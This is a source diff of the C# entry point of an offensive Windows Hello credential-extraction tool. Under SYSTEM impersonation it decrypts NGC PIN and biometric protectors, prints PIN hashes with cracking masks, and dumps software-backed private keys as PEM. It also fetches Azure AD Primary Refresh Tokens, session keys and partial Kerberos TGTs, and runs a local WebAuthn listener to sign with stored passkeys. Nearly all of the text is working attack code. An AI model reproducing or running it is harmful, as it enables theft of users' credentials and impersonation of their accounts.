@@ -5,22 +5,19 @@ using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Security.Cryptography;
 using System.Text;
-using Mono.Options;
 using NtApiDotNet;
 using Shwmae.Ngc.Keys;
 using Shwmae.Ngc.Protectors;
 using Shwmae.Ngc;
 using Shwmae.Vault;
 using System.Linq;
+using CommandLine;
+using Shwmae.Ngc.Keys.Crypto;
+using NtApiDotNet.Utilities.Text;
+using Kerberos.NET.Crypto;
 
 namespace Shwmae {
     internal class Program {
-
-        enum Mode {
-            Enum,
-            Sign,
-            PRT
-        }
 
         static bool verbose = false;
 
@@ -63,11 +60,19 @@ namespace Shwmae {
                         Console.WriteLine($"    Pin Type       : {pinProtector.PinType}");
                         Console.WriteLine($"    Length         : {(pinProtector.PinType == PinType.Numeric ? pinProtector.PinLength.ToString() : "Unknown")}");
 
+                        if (pinProtector.IsSoftware) {
+                            pinProtector.ProcessSoftwareKey(systemKeyProvider);
+                            Console.WriteLine($"    Hash           : {pinProtector.Hash}");
+                            if (pinProtector.PinType == PinType.Numeric) {
+                                Console.WriteLine($"    Mask           : {"?d".Repeat((uint)pinProtector.PinLength)}");
+                            }
+                        }
+
                         if (pin != null) {
                             try {
                                 protector.Decrypt(Encoding.Unicode.GetBytes(pin));
                                 Console.WriteLine($"    Decrypted      : True (PIN Correct)");
-                                Console.WriteLine($"    UnkPin         : {protector.External.Hex()}");
+                                Console.WriteLine($"    ExtPin         : {protector.ExternalPin.Hex()}");
                                 Console.WriteLine($"    DecryptPin     : {protector.DecryptPin.Hex()}");
                                 Console.WriteLine($"    SignPin        : {protector.SignPin.Hex()}");
                                 ngcKeySet = protector;
@@ -90,7 +95,7 @@ namespace Shwmae {
                                 try {
                                     bioProtector.Decrypt(((BioCredential)bioKey).ProtectorKey);
                                     Console.WriteLine($"    Decrypted      : True (Bio Key Correct)");
-                                    Console.WriteLine($"    UnkPin         : {bioProtector.External.Hex()}");
+                                    Console.WriteLine($"    ExtPin         : {bioProtector.ExternalPin.Hex()}");
                                     Console.WriteLine($"    DecryptPin     : {bioProtector.DecryptPin.Hex()}");
                                     Console.WriteLine($"    SignPin        : {bioProtector.SignPin.Hex()}");
                                     ngcKeySet = protector;
@@ -107,7 +112,7 @@ namespace Shwmae {
                             if (recoveryPinAesKey != null) {
                                 rp.Decrypt(recoveryPinAesKey);
                                 Console.WriteLine($"    Decrypted      : True (Recovery Key Correct)");
-                                Console.WriteLine($"    UnkPin         : {rp.External.Hex()}");
+                                Console.WriteLine($"    ExtPin         : {rp.ExternalPin.Hex()}");
                                 Console.WriteLine($"    DecryptPin     : {rp.DecryptPin.Hex()}");
                                 Console.WriteLine($"    SignPin        : {rp.SignPin.Hex()}");
                             }
@@ -117,27 +122,6 @@ namespace Shwmae {
                     }
                 }
 
-                Console.WriteLine("\n  ** Keys **");
-
-                foreach (var ngcKey in ngcContainer.Keys) {
-                    Console.WriteLine();
-                    Console.WriteLine($"    Name             : {ngcKey.Name}");
-                    Console.WriteLine($"    Provider         : {ngcKey.Provider}");
-                    Console.WriteLine($"    Key Id           : {ngcKey.KeyId}");
-                    Console.WriteLine($"    Key Path         : {(ngcKey.KeyPath != null ? ngcKey.KeyPath : "(missing)")}");
-
-                    if (ngcKey is NgcPassKey passKey) {
-                        Console.WriteLine($"    FIDO Relay Party : {passKey.RpId}");
-                        Console.WriteLine($"    FIDO Cred Id     : {passKey.CredentialId}");
-                        Console.WriteLine($"    FIDO User Id     : {passKey.UserId}");
-                        Console.WriteLine($"    FIDO User        : {passKey.Name}");
-                        Console.WriteLine($"    FIDO Display Name: {passKey.DisplayName}");
-                    } else if (ngcKey is AzureADKey aadKey) {
-                        Console.WriteLine($"    Azure Tenant Id  : {aadKey.TenantId}");
-                        Console.WriteLine($"    Azure User       : {aadKey.Email}");
-                        Console.WriteLine($"    Azure kid        : {aadKey.AzureKid}");
-                    }
-                }
 
                 Console.WriteLine("\n  ** Credentials **");
 
@@ -170,82 +154,58 @@ namespace Shwmae {
                     }
                 }
 
-            }
-        }
+                Console.WriteLine("\n  ** Keys **");
 
-        static NgcProtector GetFirstDecryptedProtector(NgcContainer container, string pin, IEnumerable<DecryptedCredential> decryptedVaultCreds) {
+                foreach (var ngcKey in ngcContainer.Keys) {
+                    Console.WriteLine();
+                    Console.WriteLine($"    Name             : {ngcKey.Name}{(ngcKey.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F" ? " (Vault Key)" : "")}");
+                    Console.WriteLine($"    Provider         : {ngcKey.Provider}");
+                    Console.WriteLine($"    Key Id           : {ngcKey.KeyId}");
+                    Console.WriteLine($"    Key File         : {( ngcKey.KeyPath != null ? Path.GetFileName(ngcKey.KeyPath) : "(missing)")}");
 
-            foreach (var protector in container.Protectors) {
-
-                if (protector is BioProtector bioProtector) {
-
-                    if (bioProtector.BioEncryptionType == BioEncryptionType.Aes) {
-                        foreach (var bioKey in decryptedVaultCreds.Where(dc => dc is BioCredential && dc.Identity == bioProtector.User.Sid)) {
-                            try {
-                                bioProtector.Decrypt(((BioCredential)bioKey).ProtectorKey);
-                                return protector;
-                            } catch (CryptographicException ce) {
-                               
-                            }
-                        }
+                    if (ngcKey is NgcPassKey passKey) {
+                        Console.WriteLine($"    FIDO Relay Party : {passKey.RpId}");
+                        Console.WriteLine($"    FIDO Public Key  : {Utils.Base64Url(passKey.PublicKey)}");
+                        Console.WriteLine($"    FIDO Cred Id     : {Utils.Base64Url(passKey.CredentialId)}");
+                        Console.WriteLine($"    FIDO User Id     : {Utils.Base64Url(passKey.UserId)}");
+                        Console.WriteLine($"    FIDO User        : {passKey.UserName}");
+                        Console.WriteLine($"    FIDO Display Name: {passKey.DisplayName}");
+                        Console.WriteLine($"    FIDO Sign Count  : {passKey.SignCount}");
+                    } else if (ngcKey is AzureADKey aadKey) {
+                        Console.WriteLine($"    Azure Tenant Id  : {aadKey.TenantId}");
+                        Console.WriteLine($"    Azure User       : {aadKey.Email}");
+                        Console.WriteLine($"    Azure kid        : {aadKey.AzureKid}");
                     }
-
-                } else if (protector is PinProtector pinProtector && pin != null) {
-                    protector.Decrypt(Encoding.Unicode.GetBytes(pin));
-                    return protector;
                 }
             }
-
-            return null;
         }
 
-        static void Main(string[] args) {
+  
+        static async void Run(object options) {
 
-            bool showHelp = false;
-            string systemDPAPI;
-            string pin = null;
-            string accessToken = null;
-            string sid = null;
-            bool doPRT = false;
-            Mode mode = Mode.Enum;
-            string keyname = null;
-            string data = null;
+            BaseOptions baseOptions = (BaseOptions)options;
 
-            OptionSet option_set = new OptionSet()
-                        .Add("h|help", "Show this help", v => showHelp = true)
-                        .Add("verbose", "Show verbose information", v => verbose = true)
-                        .Add("system-dpapi=", "The system DPAPI key", v => systemDPAPI = v)
-                        .Add("pin=", "The PIN/password user for the userVerification key protection", v => pin = v)
-                        .Add("sid=", "Dump information for a specific SID", v => sid = v)
-                        .Add("prt", "If Azure AD keys are found, request a PRT where possible", v => doPRT = true)
-                        .Add("token=", "Azure AD access token for cred.microsoft.com resource", v => accessToken = v)
-                        .Add<Mode>("mode=", "Select between Enum, Sign and PRT mode (Enum default)", v => mode = v)
-                        .Add("keyname=", "Select the key id to perform an operation on", v => keyname = v)
-                        .Add("data=", "Base64 encoded data to sign", v => data = v);
-
-            option_set.Parse(args);
-
-            if (showHelp) {
-                option_set.WriteOptionDescriptions(Console.Out);
-                return;
-            }
-
-            if ((pin != null || accessToken != null) && sid == null && mode == Mode.Enum) {
+            if ((baseOptions.PIN != null || baseOptions.RecoveryToken != null) && baseOptions.SID == null && baseOptions is EnumOptions) {
                 Console.WriteLine("[!] When pin or token is used the sid argument is needed to target a specific user");
                 return;
             }
 
+            if (baseOptions.Verbose)
+                verbose = true;
+
             IMasterKeyProvider systemKeyProvider;
             IMasterKeyProvider machineKeyProvider;
-            IEnumerable<DecryptedCredential> decryptedVaultCreds;
+            DecryptedCredential[] decryptedVaultCreds;
             RSACng deviceKey = null;
             X509Certificate2 deviceCert = null;
+            WebAuthnHttpListener listener = null;
+
 
             if (!NtToken.EnableDebugPrivilege()) {
                 Console.WriteLine("[!] Failed to enable debug privileges, are you elevated?");
                 return;
             }
-
+            
             using (var ctx = Utils.Impersonate("SYSTEM")) {
 
                 systemKeyProvider = new MasterKeyProviderSystemUser();
@@ -263,80 +223,53 @@ namespace Shwmae {
                    .Select(cred => cred.Decrypt(vaultPolicy))
                    .ToArray();
 
-                deviceCert = AzureADKey.FindDeviceCert();
-                if (deviceCert != null)
-                    deviceKey = deviceCert.GetRSAPrivateKey() as RSACng;
+                try {
+                    deviceCert = AzureADKey.FindDeviceCert();
+                    if (deviceCert != null)
+                        deviceKey = deviceCert.GetRSAPrivateKey() as RSACng;
+                }catch(CryptographicException ce) {
+                    Console.WriteLine($"[!] Failed to load Azure device key: {ce.Message}");
+                }
+
+                if (baseOptions is WebAuthnOptions) {
+                    listener = new WebAuthnHttpListener(8000);
+                    listener.Start();
+                }
             }
 
             using (var ctx = Utils.Impersonate("Ngc")) {
 
                 var ngcContainers = NgcContainer.GetAll();
 
-                if (sid != null) {
-                    ngcContainers = ngcContainers.Where(c => c.Sid == Sid.Parse(sid));
+                if (baseOptions.SID != null) {
+                    ngcContainers = ngcContainers.Where(c => c.Sid == Sid.Parse(baseOptions.SID));
                 }
 
-                if (mode == Mode.Enum) {
-                    Enumerate(ngcContainers, machineKeyProvider, systemKeyProvider, decryptedVaultCreds, pin, accessToken);
-                } else if (mode == Mode.Sign) {
+                if (baseOptions is EnumOptions) {
+                    Enumerate(ngcContainers, machineKeyProvider, systemKeyProvider, decryptedVaultCreds, baseOptions.PIN, baseOptions.RecoveryToken);
 
-                    if (data == null || keyname == null) {
-                        Console.WriteLine("[!] Both data and keyname args needed to sign data");
-                        return;
-                    }
+                } else if (baseOptions is WebAuthnOptions wano) {
 
+                    listener.PIN = baseOptions.PIN;
+                    listener.DecryptedCredentials = decryptedVaultCreds;
+                    listener.Containers = ngcContainers;
+
+                    Console.ReadLine();
+
+                }else if (baseOptions is KeyOptions keyOptions) {
+ 
                     var container = ngcContainers
-                        .Where(ngcc => ngcc.Keys.Any(k => k.Name == keyname))
+                        .Where(ngcc => ngcc.Keys.Any(k => k.Name == keyOptions.KeyName))
                         .FirstOrDefault();
 
                     if (container == default) {
-                        Console.WriteLine($"[!] Could not find key with name {keyname} in any of the NGC containers");
+                        Console.WriteLine($"[!] Could not find key with name {keyOptions.KeyName} in any of the NGC containers");
                         return;
                     }
 
                     Console.WriteLine($"[=] Found key in container {container.Id} for user {container.Sid.Name} ({container.Sid})");
 
-                    var protector = GetFirstDecryptedProtector(container, pin, decryptedVaultCreds);
-
-                    if(protector == null) {
-                        Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
-                        return;
-                    }
-
-                    Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");
-
-                    var key = container.Keys.First(k => k.Name == keyname);
-                    byte[] signedData;
-
-                    try {
-                        signedData = key.Sign(Encoding.UTF8.GetBytes(data), new NgcPin(protector.SignPin), machineKeyProvider, HashAlgorithmName.SHA256);
-                    }catch(CryptographicException) {
-                        signedData = key.Sign(Encoding.UTF8.GetBytes(data), new NgcPin(protector.External), machineKeyProvider, HashAlgorithmName.SHA256);
-                    }
-
-                    Console.WriteLine($"[+] Success:\n{Convert.ToBase64String(signedData)}");
-                
-                }else if(mode == Mode.PRT) {
-
-                    if(sid == null) {
-                        Console.WriteLine("[!] sid argument needs to be supplied to fetch a PRT");
-                        return;
-                    }
-
-                    var container = ngcContainers
-                        .Where(ngcc => ngcc.Sid.ToString() == sid && ngcc.Keys.Any(k =>(k is AzureADKey)))
-                        .FirstOrDefault();
-                                                           
-                    if (container == default) {
-                        Console.WriteLine($"[!] Could not find Azure certificate for user with SID {sid}");
-                        return;
-                    }
-
-                    var aadKey = (AzureADKey)container.Keys.First(k => k is AzureADKey);
-
-                    Console.WriteLine($"[=] Found Azure key with UPN {aadKey.Email} and kid {aadKey.AzureKid}");
-
-                    var protector = GetFirstDecryptedProtector(container, pin, decryptedVaultCreds);
+                    var protector = container.GetFirstDecryptedProtector(baseOptions.PIN, decryptedVaultCreds, systemKeyProvider);
 
                     if (protector == null) {
                         Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
@@ -344,25 +277,100 @@ namespace Shwmae {
                     }
 
                     Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");
-                    
-                    ctx.Revert();
-                    using (var systemCtx = Utils.Impersonate("SYSTEM")) {
 
-                        aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert);
-                        Console.WriteLine($"    Transport Key    : {aadKey.TransportKeyName}");
+                    var key = container.Keys.First(k => k.Name == keyOptions.KeyName);
 
-                        if (aadKey.PRT != null) {
-                            var prtFile = $"{aadKey.Email}-{aadKey.TenantId}.prt";
-                            File.WriteAllText(prtFile, aadKey.PRT);
-                            Console.WriteLine($"    Azure PRT Saved  : {prtFile}");
+                    if (keyOptions is SignOptions signOptions) {
+
+                        byte[] signedData;
+
+                        try {
+                            signedData = key.Sign(Encoding.UTF8.GetBytes(signOptions.Data), new NgcPin(protector.SignPin), machineKeyProvider, HashAlgorithmName.SHA256);
+                        } catch (CryptographicException) {
+                            signedData = key.Sign(Encoding.UTF8.GetBytes(signOptions.Data), new NgcPin(protector.ExternalPin), machineKeyProvider, HashAlgorithmName.SHA256);
                         }
 
-                        if (aadKey.PartialTGT != null) {
-                            Console.WriteLine($"    Partial TGT      :\n {aadKey.PartialTGT}");
+                        Console.WriteLine($"[+] Success:\n{Convert.ToBase64String(signedData)}");
+
+                    }else if(keyOptions is DumpOptions) {
+
+                        if(!key.IsSoftware) {
+                            Console.WriteLine($"[!] Cannot dump key with id {key.Name} as it's backed by TPM");
+                            return;
                         }
-                    }                    
+
+                        byte[] keyData;
+
+                        try {
+                            keyData = key.Dump(new NgcPin(protector.SignPin), systemKeyProvider);
+                        } catch (CryptographicException) {
+                            keyData = key.Dump(new NgcPin(protector.DecryptPin), systemKeyProvider);
+                        }
+
+                        Console.WriteLine("-----BEGIN PRIVATE KEY-----");
+                        Console.WriteLine(Convert.ToBase64String(keyData, Base64FormattingOptions.InsertLineBreaks));
+                        Console.WriteLine("-----END PRIVATE KEY-----");
+                    }
+
+                } else if (baseOptions is PrtOptions prtOptions) {
+
+                    if (prtOptions.GenerateKeys) {
+
+                    } else {
+
+                        if (baseOptions.SID == null) {
+                            Console.WriteLine("[!] sid argument needs to be supplied to fetch a PRT");
+                            return;
+                        }
+
+                        var container = ngcContainers
+                            .Where(ngcc => ngcc.Sid.ToString() == baseOptions.SID && ngcc.Keys.Any(k => (k is AzureADKey)))
+                            .FirstOrDefault();
+
+                        if (container == default) {
+                            Console.WriteLine($"[!] Could not find Azure certificate for user with SID {baseOptions.SID}");
+                            return;
+                        }
+
+                        var aadKey = (AzureADKey)container.Keys.First(k => k is AzureADKey);
+
+                        Console.WriteLine($"[=] Found Azure key with UPN {aadKey.Email} and kid {aadKey.AzureKid}");
+
+                        var protector = container.GetFirstDecryptedProtector(baseOptions.PIN, decryptedVaultCreds, systemKeyProvider);
+
+                        if (protector == null) {
+                            Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
+                            return;
+                        }
+
+                        Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");
+
+                        ctx.Revert();
+                        using (var systemCtx = Utils.Impersonate("SYSTEM")) {
+
+                            aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert);
+                            Console.WriteLine($"    Transport Key    : {aadKey.TransportKeyName}");
+
+                            if (aadKey.PRT != null) {
+                                var prtFile = $"{aadKey.Email}-{aadKey.TenantId}.prt";
+                                File.WriteAllText(prtFile, aadKey.PRT);
+                                Console.WriteLine($"    PRT              : {aadKey.PRTRefreshToken}");
+                                Console.WriteLine($"    PRT Random Ctx   : {aadKey.Ctx.Hex()}");
+                                Console.WriteLine($"    PRT Derived Key  : {aadKey.PopSessionKey.Hex()}");
+                            }
+
+                            if (aadKey.PartialTGT != null) {
+                                Console.WriteLine($"    Partial TGT      :\n {aadKey.PartialTGT}");
+                            }
+                        }
+                    }
                 }
             }
+        }
+
+        static void Main(string[] args) {
+            Parser.Default.ParseArguments(args, new Type[] { typeof(EnumOptions), typeof(SignOptions), typeof(PrtOptions), typeof(WebAuthnOptions), typeof(DumpOptions) })
+                .WithParsed(Run);               
         }
     }
 }
